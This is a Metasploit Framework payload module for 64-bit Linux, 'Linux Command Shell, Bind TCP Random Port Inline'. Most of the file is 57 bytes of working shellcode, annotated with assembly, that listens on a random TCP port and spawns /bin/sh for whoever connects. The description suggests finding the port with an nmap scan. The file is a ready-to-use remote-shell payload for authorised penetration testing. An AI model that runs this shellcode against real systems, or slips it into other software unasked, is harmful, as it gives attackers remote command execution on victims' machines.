##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 57

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
      'Description'   => %q{
        Listen for a connection in a random port and spawn a command shell.
        Use nmap to discover the open port: 'nmap -sS target -p-'.
      },
      'Author'        => 'Geyslan G. Bem <geyslan[at]gmail.com>',
      'License'       => BSD_LICENSE,
      'References'    => ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/shell_bind_tcp_random_port_x86_64.asm'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Payload'       =>
        {
          'Payload' =>
            "\x48\x31\xf6"          + #  xor    %rsi,%rsi
            "\x48\xf7\xe6"          + #  mul    %rsi
            "\xff\xc6"              + #  inc    %esi
            "\x6a\x02"              + #  pushq  $0x2
            "\x5f"                  + #  pop    %rdi
            "\xb0\x29"              + #  mov    $0x29,%al
            "\x0f\x05"              + #  syscall
            "\x52"                  + #  push   %rdx
            "\x5e"                  + #  pop    %rsi
            "\x50"                  + #  push   %rax
            "\x5f"                  + #  pop    %rdi
            "\xb0\x32"              + #  mov    $0x32,%al
            "\x0f\x05"              + #  syscall
            "\xb0\x2b"              + #  mov    $0x2b,%al
            "\x0f\x05"              + #  syscall
            "\x57"                  + #  push   %rdi
            "\x5e"                  + #  pop    %rsi
            "\x48\x97"              + #  xchg   %rax,%rdi
            "\xff\xce"              + #  dec    %esi
            "\xb0\x21"              + #  mov    $0x21,%al
            "\x0f\x05"              + #  syscall
            "\x75\xf8"              + #  jne    40009f
            "\x52"                  + #  push   %rdx
            "\x48\xbf\x2f\x2f\x62"  + #  movabs $0x68732f6e69622f2f,%rdi
            "\x69\x6e\x2f\x73\x68"  +
            "\x57"                  + #  push   %rdi
            "\x54"                  + #  push   %rsp
            "\x5f"                  + #  pop    %rdi
            "\xb0\x3b"              + #  mov    $0x3b,%al
            "\x0f\x05"                #  syscall
        }
      ))
  end
end
